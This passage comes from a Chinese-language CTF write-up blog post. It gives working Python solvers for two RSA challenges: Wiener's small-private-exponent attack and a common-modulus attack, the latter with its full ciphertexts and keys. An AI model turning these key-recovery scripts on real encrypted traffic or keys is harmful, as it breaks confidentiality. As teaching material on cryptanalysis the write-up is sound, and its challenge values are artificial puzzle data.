[a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to calculate the convergents from a continued fraction</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    convs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)):</span><br><span class="line">        convs.append(contfrac_to_rational(frac[<span class="number">0</span>:i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to convert a continued fraction back to a rational number</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extended Euclidean Algorithm</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = extended_gcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modular inverse function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="comment"># Integer square root function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to crack RSA using Wiener&#x27;s attack</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># Check if x^2 - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack the private key</span></span><br><span class="line">private_exponent = crack_rsa(public_exponent, n)</span><br><span class="line">decrypted_message = <span class="built_in">pow</span>(c, private_exponent, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now use the second and third ciphertexts to decrypt further messages</span></span><br><span class="line">private_key_1 = inverse(public_exponent, decrypted_message - <span class="number">1</span>)</span><br><span class="line">message_1 = <span class="built_in">pow</span>(ciphertext_2, private_key_1, decrypted_message)</span><br><span class="line"></span><br><span class="line">private_key_2 = inverse(<span class="number">65537</span>, decrypted_message - <span class="number">1</span>)</span><br><span class="line">message_2 = <span class="built_in">pow</span>(ciphertext_3, private_key_2, decrypted_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Output the result of the decryption</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(message_2))</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/big-math-1.png"></p>
<h3 id="ezCMA"><a href="#ezCMA" class="headerlink" title="ezCMA"></a>ezCMA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line">flag3 = <span class="built_in">pow</span>(m1,e3,n)</span><br></pre></td></tr></table></figure>
<p><strong>分析题目</strong><br>m1是由flag转换得到的整数，p,q是两个长度为1024的素数，n是模数<br>其中<strong>有一个明显的特点是</strong>flag1、flag2、flag3是由 <strong>同一个明文(m1)</strong> 通过不同的指数e1、e2、e3和<strong>相同的模数n</strong>生成的，由此联想到共模攻击解出密文<br>且指数e1、e2、e3之间存在<strong>巧妙的联系</strong></p>
<ul>
<li>e1 &#x3D; 993627907847 * 1016231455597</li>
<li>e2 &#x3D; 1016231455597 * 902914473557</li>
<li>e3 &#x3D; 993627907847 * 902914473557</li>
</ul>
<p>共模攻击（Common Modulus Attack）是RSA加密中的一种攻击方式，发生在多个用户使用相同的模数 ( n ) 但有不同的公钥 ( e ) 时。由于RSA的安全性依赖于模数 ( n ) 的唯一性，如果两个或多个用户共享相同的模数，而使用不同的公钥，则会使系统容易受到这种攻击。</p>
<p><strong>共模攻击的基本原理</strong><br>假设有两个用户，Alice 和 Bob，他们的RSA模数 ( n ) 相同，但公钥不同，分别为 ( e_1 ) 和 ( e_2 )。攻击者假设 Alice 和 Bob 都用各自的公钥加密了相同的明文消息 ( m )，得到密文 ( c_1 &#x3D; m^{e_1} \pmod{n} ) 和 ( c_2 &#x3D; m^{e_2} \pmod{n} )。</p>
<p>因为 ( c_1 ) 和 ( c_2 ) 都是相同的明文 ( m ) 的幂，且已知 ( e_1 )、( e_2 ) 和 ( n )，攻击者可以通过以下步骤解密消息：</p>
<ol>
<li><p><strong>计算扩展欧几里得算法</strong>：通过扩展欧几里得算法找到两个整数 ( a ) 和 ( b )，使得 ( a \times e_1 + b \times e_2 &#x3D; 1 )。</p>
</li>
<li><p><strong>利用 ( a ) 和 ( b ) 构造明文</strong>：</p>
<ul>
<li>因为 ( m^{e_1} \equiv c_1 \pmod{n} ) 和 ( m^{e_2} \equiv c_2 \pmod{n} )，可以利用 ( a ) 和 ( b ) 的线性组合得到：<br>[<br>m &#x3D; c_1^a \times c_2^b \pmod{n}<br>]</li>
<li>这样就能通过计算复原原始的明文 ( m )。</li>
</ul>
</li>
</ol>
<p><strong>整体思想</strong><br>通过给定的三个加密密文 flag1、flag2 和 flag3，以及与每个密文相关的指数 e1、e2 和 e3，来解密出原始消息 m</p>
<ul>
<li><p>对 e1 和 e2 进行整除运算，将 e1 和 e2 转化为较小的指数<br>e1&#x3D;1009755935113158588369659&#x2F;&#x2F;1016231455597<br>e2&#x3D;917570089742429076148529&#x2F;&#x2F;1016231455597</p>
</li>
<li><p>通过中国剩余定理计算 m1<br>将 flag1 和 flag2 的幂次分别由 x 和 y 进行组合，得到 m1，即：<br>m1&#x3D;pow(c1,x,n)<em>pow(c2,y,n)%n<br>这是通过扩展欧几里得算法求出 x 和 y（满足 e1</em>x + e2*y &#x3D; gcd(e1, e2)）来完成的</p>
</li>
<li><p>对 e1 和 e3 进行整除运算，将 e1 和 e3 转化为较小的指数</p>
</li>
<li><p>通过与 m1 类似的步骤，使用中国剩余定理计算出 m2，即 m^993627907847 的解。</p>
</li>
<li><p>使用最后的 1016231455597 和 993627907847 作为指数，并使用中国剩余定理和扩展欧几里得算法求出 m<br>m&#x3D;pow(m1,x2,n)*pow(m2,y2,n)%n</p>
</li>
</ul>
<p><strong>python程序</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">flag1= <span class="number">8474478534133750496351258439770439219153979952561642731581390416228867640587693486357078135921546443963283105927150253272336059382390513817706698741025531526550326710611170554397057390714665263299882969421138898580414905289818079694175809121588275768717653289810969178070603654027459939946312773093941446287417784032902650734437554613303784830203578240545070093473942475651339619315817364422284273133164774638578085796267096957347085168021778125470616046598013171354398170377063192357733840050955181584705301456304877682550520037398962644014863486620415201523880999542686731895448726980398631515217315286020437688498</span></span><br><span class="line">flag2= <span class="number">3351384523931867313334817228598784440559751009017798910409840467537119821259012274549685345550490291816260612536289106819125192140760817375064269268775476031424892776272822066072079425305661428795671314658531045416112945555811194297108918942072330688307026110408024089214342917098967614776154381488672421957083146560757683623642006092146862507588998409298919637353660377267802188093929938573350202326786505140838600085071746441060977159281922113489848540031614769737591885173161155206855583607310005623436257762906278289722207498226001933784659324565536246902660945534285429590539413563048095506554626251616237676085</span></span><br><span class="line">flag3= <span class="number">5985698167580292228103775342057124425925837097208523314550523309415437277838160594697403652576181505738376124206117744930374928505854417093291293722474344968937532770265145298388658073650787591858476178872911073027696260914967170228919432784475518233719515218760252671051270000581279546881292735906936176213503922783551190771955716934727562595180860790040848587585167859997365531513159440802207174497260444085610261175085531334936547028947562016756271409639098566910202260260565739379965380545050237791613249984011652443416356033660746709478575412073746217796066838355640159345205738259110105894918059407651872299890</span></span><br><span class="line">e1= <span class="number">1009755935113158588369659</span></span><br><span class="line">e2= <span class="number">917570089742429076148529</span></span><br><span class="line">e3= <span class="number">897161019325217314301779</span></span><br><span class="line">n= <span class="number">11295998674923997915943754979924400482910956167036135115104616066253068788768361485681020525394574700945440467310782667910252047979768627604509086553949220752907396584699810630157139575845491574958788530608310999859562983302417094883322550125648741172503117372394024013743440114452080863483618324236843484216327589328115588675048041658149492207605113019716406368620938899561099206060294485156146873711072426006320715336473956395729172889050029370044109346990187611892568329248392149357401050824185160821078105634351600311316865993926248187857295191981143425250483512228653210803684450509179107949521855027236290889869</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新的公钥指数和密文名称</span></span><br><span class="line">exp1 = <span class="number">1009755935113158588369659</span> // <span class="number">1016231455597</span> </span><br><span class="line">exp2 = <span class="number">917570089742429076148529</span> // <span class="number">1016231455597</span> </span><br><span class="line"></span><br><span class="line">cipher1 = flag1 </span><br><span class="line">cipher2 = flag2  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用扩展欧几里得算法计算 exp1 和 exp2 的最大公约数 gcd，以及贝祖系数 x 和 y</span></span><br><span class="line"><span class="comment"># gcd 是 exp1 和 exp2 的最大公约数，x 和 y 是贝祖系数，使得 gcd = exp1 * x + exp2 * y</span></span><br><span class="line">gcd1, coeff_x1, coeff_y1 = gcdext(exp1, exp2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解出 intermediate_m1，即 cipher1^x * cipher2^y mod n</span></span><br><span class="line"><span class="comment"># intermediate_m1 相当于 m 的 1016231455597 次幂模 n 的结果</span></span><br><span class="line">intermediate_m1 = <span class="built_in">pow</span>(cipher1, coeff_x1, n) * <span class="built_in">pow</span>(cipher2, coeff_y1, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二组公钥指数</span></span><br><span class="line">exp3 = <span class="number">1009755935113158588369659</span> // <span class="number">993627907847</span>  </span><br><span class="line">exp4 = <span class="number">897161019325217314301779</span> // <span class="number">993627907847</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用扩展欧几里得算法计算 exp3 和 exp4 的最大公约数 gcd2，以及贝祖系数 x2 和 y2</span></span><br><span class="line"><span class="comment"># gcd2 是 exp3 和 exp4 的最大公约数，x2 和 y2 是贝祖系数，使得 gcd2 = exp3 * x2 + exp4 * y2</span></span><br><span class="line">gcd2, coeff_x2, coeff_y2 = gcdext(exp3, exp4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解出 intermediate_m2，即 cipher1^x2 * flag3^y2 mod n</span></span><br><span class="line"><span class="comment"># intermediate_m2 相当于 m 的 993627907847 次幂模 n 的结果</span></span><br><span class="line">intermediate_m2 = <span class="built_in">pow</span>(cipher1, coeff_x2, n) * <span class="built_in">pow</span>(flag3, coeff_y2, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于组合两个解密结果的公钥指数</span></span><br><span class="line">exp_final1 = <span class="number">1016231455597</span>  <span class="comment"># 原来的 eee1</span></span><br><span class="line">exp_final2 = <span class="number">993627907847</span>  <span class="comment"># 原来的 eee2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用扩展欧几里得算法计算 exp_final1 和 exp_final2 的最大公约数 gcd_final，以及贝祖系数 x_final 和 y_final</span></span><br><span class="line"><span class="comment"># gcd_final 是 exp_final1 和 exp_final2 的最大公约数，x_final 和 y_final 是贝祖系数，使得 gcd_final = exp_final1 * x_final + exp_final2 * y_final</span></span><br><span class="line">gcd_final, coeff_x_final, coeff_y_final = gcdext(exp_final1, exp_final2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终解密结果，将 intermediate_m1 和 intermediate_m2 的组合计算得到明文 m</span></span><br><span class="line"><span class="comment"># 这里解密过程使用了 m1 和 m2 的贝祖组合，通过 m1^x_final * m2^y_final mod n 得到 m</span></span><br><span class="line">final_message = <span class="built_in">pow</span>(intermediate_m1, coeff_x_final, n) * <span class="built_in">pow</span>(intermediate_m2, coeff_y_final, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的整数转换为字符串形式的明文</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(final_message))</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/ezCMA.png"></p>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>CTF's wp</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://doraemonblogs.github.io/2024/10/12/wp/">https://doraemonblogs.github.io/2024/10/12/wp/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>Doraemon</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-10-12</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-10-12</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Flag/">Flag</a></div><div class="post_share"><div class="social-share" data-image="/img/top_img/9.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>投喂作者</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/10/10/Summary/" title="知识图谱"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/top_img/5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">知识图谱</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/profile.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Doraemon</div><div class="author-info__description">保持热爱,奔赴山海</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/doraemonblogs"><i class="fab fa-github"></i><span>🚀前往小窝...</span></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/Doraemonblogs" target="_blank" title="Github"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-github"></use></svg></a><a class="social-icon faa-parent animated-hover" href="mailto:3090503843@qq.com" target="_blank" title="邮件"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-youjian"></use></svg></a><a class="social-icon faa-parent animated-hover" href="/img/QRCode.png" target="_blank" title="微信"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-weixin"></use></svg></a><a class="social-icon faa-parent animated-hover" href="/img/qq.jpg" target="_blank" title="QQ"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-QQ"></use></svg></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/3494359538338457?spm_id_from=333.1007.0.0" target="_blank" title="B站"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-bilibili"></use></svg></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><a class="faa-parent animated-hover"><svg class="faa-tada icon" style="height:25px;width:25px;fill:currentColor;position:relative;top:5px" aria-hidden="true"><use xlink:href="#icon-xinwengonggao"></use></svg></a><span>公告栏</span></div><div class="announcement_content">欢迎来到我的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%85%E7%BA%A7%E4%BE%A6%E6%8E%A2"><span class="toc-number">1.1.</span> <span class="toc-text">超级侦探</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ft8"><span class="toc-number">1.2.</span> <span class="toc-text">ft8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZipZip"><span class="toc-number">1.3.</span> <span class="toc-text">ZipZip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E7%9F%A5%E9%81%93Blockchain%E5%98%9B"><span class="toc-number">1.4.</span> <span class="toc-text">你知道Blockchain嘛?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88-%E6%B3%A8%E5%85%A5-%E7%9C%9F%E7%9A%84%E5%81%87%E7%9A%84"><span class="toc-number">1.5.</span> <span class="toc-text">什么?注入?真的假的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezphp"><span class="toc-number">2.1.</span> <span class="toc-text">ezphp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AC%E8%AF%B4%E4%BD%A0%E6%98%AFpvz%E9%AB%98%E6%89%8B"><span class="toc-number">3.1.</span> <span class="toc-text">听说你是pvz高手</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#big-math"><span class="toc-number">4.1.</span> <span class="toc-text">big_math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezCMA"><span class="toc-number">4.2.</span> <span class="toc-text">ezCMA</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2024 By Doraemon</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="//at.alicdn.com/t/c/font_4701216_bqybv098814.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_footer_beautify_injector_config(){
    var parent_div_git = document.getElementById('footer-wrap');
